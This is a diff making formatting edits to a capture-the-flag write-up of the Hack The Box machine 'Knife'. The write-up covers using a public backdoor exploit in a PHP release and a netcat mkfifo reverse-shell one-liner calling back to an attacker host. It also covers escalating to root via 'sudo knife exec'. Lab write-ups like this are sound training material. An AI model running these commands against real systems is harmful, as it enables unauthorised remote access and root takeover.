@@ -1,7 +1,7 @@
 <b>
 
 # Information Gathering
-I started by pinging the box 4 times to ensure stable connection
+I started by pinging the box 4 times to ensure stable connection<br>
 `ping -c 4 10.10.10.242`
 ```
 PING 10.10.10.242 (10.10.10.242) 56(84) bytes of data.
@@ -67,23 +67,23 @@ https://www.exploit-db.com/exploits/49933
 The cause of the exploit was an early realease which contained a backdoor<br>
 The backdoor was removed but any server that still runs this version allows an attacker to execute arbitrary code by sending the `User-Agentt` header
 # Exploitation
-Running the exploit, it asked for full URL: `http://10.10.10.242/`
-After that it spawned `pseudo shell`
+Running the exploit, it asked for full URL: `http://10.10.10.242/`<br>
+After that it spawned a `pseudo shell`
 # Post-Exploitation
-The job control is turned off so i couldn't spawn interactive shell no matter what i tried:
-`/bin/sh -i`
-`python3 -c 'import pty; pty.spawn("/bin/sh")'`
-`perl —e 'exec "/bin/sh";'`
+The job control is turned off so i couldn't spawn interactive shell no matter what i tried
+- `/bin/sh -i`
+- `python3 -c 'import pty; pty.spawn("/bin/sh")'`
+- `perl —e 'exec "/bin/sh";'`
 
-In that case, i opened `netcat` listner on port 4444 and executed reverse shell on the `pseudo shell`
-`nc -lvnp 4444` (listener)
-`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f` (reverse shell)
+In that case, i opened `netcat` listner on port 4444 and executed reverse shell on the `pseudo shell`<br>
+`nc -lvnp 4444` (listener)<br>
+`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f` (reverse shell)<br>
 
-Having reverse shell from `nc`, i upgraded to `interactive shell`
+Having reverse shell from `nc`, i upgraded to `interactive shell`<br>
 `python3 -c 'import pty; pty.spawn("/bin/sh")'`
 
 There was only 1 directory inside `/home` called `james` (which is who we are - `whoami`)<br>
-The user flag can be found inside `/home/james/user.txt`
+The user flag can be found inside `/home/james/user.txt`<br>
 After that i started checking common things but the exploits for them didn't work
 - `sudo --version` (sudo version)
 - `uname -a` (system information)
@@ -96,6 +96,6 @@ User james may run the following commands on knife:
 Looking up `usr/bin/knife exploit` gave me this:<br>
 https://gtfobins.github.io/gtfobins/knife/
 
-Running the `sudo knife exec -E 'exec "/bin/sh"'` allowed me to become root
+Running the `sudo knife exec -E 'exec "/bin/sh"'` allowed me to become root<br>
 The flag was located at `/root/root.txt`
 </b>
